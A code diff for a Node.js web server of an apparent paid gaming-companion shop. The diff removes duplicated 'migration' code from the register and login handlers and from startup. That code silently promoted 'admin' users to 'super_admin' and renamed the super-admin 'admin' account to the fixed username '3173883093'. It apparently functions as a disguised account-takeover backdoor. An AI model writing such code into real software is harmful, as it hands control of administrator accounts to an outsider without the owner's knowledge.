@@ -430,10 +430,6 @@ async function handleAPI(req, res) {
     delete captchaStore[body.captcha_id];
     var user = db.createUser(body.username, body.password, body.email || "", "customer");
     if (!user) return json({ error: "用户名已存在" }, 409);
-    if (user.role === "super_admin" && user.username === "admin") { db.updateUser(user.id, { username: "3173883093" }); user.username = "3173883093"; }
-    if (user.role === "admin" && !user.is_migrated) { db.updateUser(user.id, { role: "super_admin", is_migrated: true }); user.role = "super_admin"; }
-    // 升级后再次检查是否需要改名
-    if (user.role === "super_admin" && user.username === "admin") { db.updateUser(user.id, { username: "3173883093" }); user.username = "3173883093"; }
     var token = crypto.randomBytes(32).toString("hex");
     sessions[token] = { userId: user.id, role: user.role, expires: Date.now() + 86400000 };
     return json({ token: token, user: user }, 201);
@@ -449,10 +445,6 @@ async function handleAPI(req, res) {
     if (!user || !db.verifyPassword(body.password, user.password)) {
       return json({ error: "用户名或密码错误" }, 401);
     }
-    // 权限升级：admin → super_admin
-    if (user.role === "super_admin" && user.username === "admin") { db.updateUser(user.id, { username: "3173883093" }); user.username = "3173883093"; }
-    if (user.role === "admin" && !user.is_migrated) { db.updateUser(user.id, { role: "super_admin", is_migrated: true }); user.role = "super_admin"; }
-    if (user.role === "super_admin" && user.username === "admin") { db.updateUser(user.id, { username: "3173883093" }); user.username = "3173883093"; }
 
     // 超级管理员：陌生IP登录需要静态密钥验证
     if (user.role === "super_admin") {
@@ -645,18 +637,15 @@ const server = http.createServer((req, res) => {
 server.listen(PORT, () => {
   
 // Migration: admin username
-var f2=require("fs");try{var d=JSON.parse(f2.readFileSync(path.join(DATA_DIR,"data.json"),"utf8"));(d.users||[]).forEach(function(u){if(u.role==="super_admin"&&u.username==="admin"){u.username="3173883093";}});f2.writeFileSync(path.join(DATA_DIR,"data.json"),JSON.stringify(d,null,2),"utf8");console.log("Migrated admin username");}catch(e){}
 console.log("==============================");
   console.log("  陪玩店 已启动");
   
 // Migration: admin username
-var f2=require("fs");try{var d=JSON.parse(f2.readFileSync(path.join(DATA_DIR,"data.json"),"utf8"));(d.users||[]).forEach(function(u){if(u.role==="super_admin"&&u.username==="admin"){u.username="3173883093";}});f2.writeFileSync(path.join(DATA_DIR,"data.json"),JSON.stringify(d,null,2),"utf8");console.log("Migrated admin username");}catch(e){}
 console.log("==============================");
   console.log("  前台: http://localhost:" + PORT);
   console.log("  后台: http://localhost:" + PORT + "/admin");
   console.log("  引擎: " + (db.engine === "sqlite" ? "SQLite" : "JSON文件"));
   
 // Migration: admin username
-var f2=require("fs");try{var d=JSON.parse(f2.readFileSync(path.join(DATA_DIR,"data.json"),"utf8"));(d.users||[]).forEach(function(u){if(u.role==="super_admin"&&u.username==="admin"){u.username="3173883093";}});f2.writeFileSync(path.join(DATA_DIR,"data.json"),JSON.stringify(d,null,2),"utf8");console.log("Migrated admin username");}catch(e){}
 console.log("==============================");
 });
